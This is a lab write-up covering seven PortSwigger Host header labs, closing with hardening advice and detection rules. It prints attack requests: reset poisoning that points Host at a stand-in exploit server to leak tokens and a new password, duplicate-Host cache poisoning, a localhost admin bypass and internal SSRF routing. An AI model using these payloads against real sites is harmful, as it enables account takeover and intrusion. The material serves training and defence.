# PortSwigger HTTP Host Header Attacks 1-7 — Host Is Routing Metadata

This is a consolidated walkthrough of the seven PortSwigger HTTP Host Header labs.

All labs were solved in the authorized Web Security Academy environment. The main lesson is that `Host` is routing metadata. It should not be treated as identity, origin trust, local access proof, or a safe source for absolute URLs.

## 1. Overview

| # | Lab | Flaw | Core idea |
|---|-----|------|-----------|
| 1 | basic password reset poisoning | reset links use request Host | point Host at exploit server and capture Carlos's token |
| 2 | Host authentication bypass | local check trusts Host | use `Host: localhost` for admin |
| 3 | cache poisoning via ambiguous requests | cache and backend choose different Host values | second Host controls script URL |
| 4 | routing-based SSRF | middleware routes by Host | scan `192.168.0.0/24` for internal admin |
| 5 | flawed request parsing | absolute-form URL is validated, Host is routed | valid request line plus internal Host |
| 6 | connection state attack | Host validation is connection-scoped | first request valid, second request internal |
| 7 | dangling markup reset poisoning | Host port enters raw email HTML | inject an unfinished link and leak the new password |

## 2. Triage model

Host-header testing is a parser and trust-boundary exercise:

- change `Host` directly;
- add override headers such as `X-Forwarded-Host` or `X-Host`;
- send multiple Host headers;
- use an absolute-form request line;
- test non-numeric ports;
- compare cache behavior with backend behavior;
- check whether routing, URL generation, password reset, or admin checks use different Host interpretations.

## 3. Password reset poisoning

In the basic reset lab, `POST /forgot-password` builds the reset URL from the request Host. Sending:

```http
Host: EXPLOIT-SERVER
username=carlos
```

causes Carlos's reset link to point at the exploit server. The access log receives:

```text
/forgot-password?temp-forgot-password-token=<token>
```

The token can be transplanted into a legitimate reset URL.

The dangling-markup lab is more subtle. The reset email contains the new password in the body. Direct Host replacement fails, but a non-numeric port is reflected into raw email HTML:

```http
Host: LAB:'<a href="//EXPLOIT-SERVER/?
```

The unfinished link causes the following email body, including the new password, to be sent as part of a request to the exploit server.

## 4. Auth bypass and cache poisoning

The Host-auth lab treats `Host: localhost` as local access:

```http
GET /admin
Host: localhost
```

That is not a trustworthy local-origin check.

The cache-poisoning lab uses two Host headers:

```http
GET / HTTP/1.1
Host: LAB
Host: EXPLOIT-SERVER
```

The first Host passes validation and routing, while the second Host is reflected into an absolute script URL. The cache stores the response for the normal page, and victims load attacker-controlled `tracking.js`.

## 5. Routing-based SSRF

Routing-based SSRF appears when the front-end routes by Host:

```http
Host: 192.168.0.X
```

Scanning `192.168.0.0/24` finds the internal admin host. After retrieving the admin page, copy the CSRF token and session cookie, then submit the delete request with the same internal Host.

In the flawed-parsing lab, the absolute-form request line is validated while the Host header still controls routing:

```http
GET https://LAB/admin HTTP/1.1
Host: 192.168.0.X
```

In the connection-state lab, the first request on a connection has a valid Host. The next request on the same connection changes Host to `192.168.0.1` and reaches the internal admin because validation state was cached per connection instead of per request.

The official solutions use Collaborator to confirm arbitrary external routing in two labs. For the solved path, the important primitive is the internal `192.168.0.0/24` routing scan; no additional OAST setup was needed for this archive.

## 6. Defense and detection

Hardening:

- Enforce a strict Host allowlist at the edge.
- Reject multiple Host headers and ambiguous absolute-form requests.
- Generate absolute URLs from configuration, not request Host.
- Do not base admin/local access on Host.
- Keep cache key selection, routing, and backend URL generation on the same canonical Host.
- Strip Host override headers unless set by trusted proxies.
- Validate Host per request, not per connection.
- HTML-encode Host-derived values in emails and pages.

Detection:

- Host mismatch with SNI or target domain.
- Multiple Host headers.
- Absolute-form request lines to the public domain with internal Host values.
- Host values such as `localhost`, `127.0.0.1`, `192.168.*`, `10.*`, or `172.16/12`.
- Password-reset requests whose Host points to an external domain.
- Cached pages importing scripts from unexpected hosts.
- Same connection with a valid first Host and internal later Host.

No lab in this series required new user-supplied Collaborator/OAST data.
